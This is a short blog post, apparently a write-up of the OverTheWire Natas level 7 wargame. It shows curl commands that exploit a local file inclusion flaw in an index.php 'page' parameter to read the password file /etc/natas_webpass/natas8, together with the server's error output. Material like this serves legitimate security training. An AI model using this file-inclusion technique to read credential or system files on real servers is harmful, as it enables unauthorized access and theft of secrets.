---
title: "Over the wire - Natas7"
date: 2026-03-08T21:37:03+00:00
draft: false 
toc: false
images:
tags:
  - Over the wire
  - Natas
  - Curl
  - Linux
  - Web Security
---



The starting point is as usual:

```bash
URL=http://natas7.natas.labs.overthewire.org

curl --user  natas7:$(cat natas7 ) $URL
```

I immediately know what i'll need to do. 
I have 2 ```<a href="index.php?page=home">Home</a>``` html tags and a ```<a href="index.php?page=about">About</a>```.

What it means that we can traverse the website via this **index.php?page=xyz**

We also get a hint:
```html
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
```


I check my theory:
```bash
curl --user  natas7:$(cat natas7 ) $URL"/index.php?page=/etc/"
```

And I get this:
```html
<b>Warning</b>:  include(/etc): failed to open stream: Not a directory in <b>/var/www/natas/natas7/index.php</b> on line <b>21</b><br />
<br />
<b>Warning</b>:  include(): Failed opening '/etc/' for inclusion (include_path='.:/usr/share/php') in <b>/var/www/natas/natas7/index.php</b> on line <b>21</b><br />
```

Whenever you see something extraordinary/weird, you just gotta follow the lead. 

In this case, its [Local file inclusion](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion). A file is passed to index.php, that means if the user input is not properly validated/ sanatized, it can be used to access unintended files.
```bash
curl --user  natas7:$(cat natas7 ) $URL"/index.php?page=/etc/natas_webpass/natas8"
```

I get the password and on to the next challenge.
